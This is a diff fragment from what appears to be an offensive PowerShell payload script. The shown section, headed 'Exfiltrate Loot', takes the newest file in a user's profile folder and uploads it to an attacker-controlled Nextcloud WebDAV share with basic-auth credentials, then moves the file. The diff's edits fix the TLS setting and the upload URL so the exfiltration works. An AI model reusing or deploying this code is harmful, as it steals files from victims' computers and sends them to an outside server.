@@ -488,12 +488,13 @@ echo $listener >> $env:USERPROFILE\$FileName
 # Exfiltrate Loot
 ########################################################
 #Loot web upload to nextcloud server.(Default)
-$Item = Get-ChildItem $env:USERPROFILE | Sort-Object LastWriteTime | Select-Object -last 1
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$Item = (Get-ChildItem $env:USERPROFILE | Sort-Object LastWriteTime | Select-Object -last 1)
 $Headers = @{
     "Authorization" = "Basic "+[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$($ShareID):$($SharePass)"));
     "X-Requested-With"="XMLHttpRequest";
     }
-$URLBUILD = "$($NextCloudURL)/public.php/webdav/$($Item)"
+$URLBUILD = "$($NextCloudURL)/public.php/webdav/$($Item.Name)"
 Invoke-RestMethod -Uri $URLBUILD -InFile $Item.Fullname -Headers $Headers -Method Put 
 Move-Item $env:USERPROFILE\$Item $TARGETDIR
 
